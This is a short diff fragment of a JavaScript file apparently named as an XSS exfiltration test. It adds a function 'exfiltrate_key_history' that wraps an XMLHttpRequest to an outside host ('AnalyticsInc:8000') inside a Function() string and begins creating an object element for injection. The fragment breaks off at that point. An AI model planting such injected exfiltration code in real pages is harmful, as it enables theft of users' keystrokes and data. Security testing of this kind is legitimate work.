@@ -1,3 +1,4 @@
+// exfil_test_xss3.js
 function exfiltrate_key_history() {
   var URL = 'Function(\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss3",true);xmlhttp.send(null);\')()';
   var script = document.createElement("object");
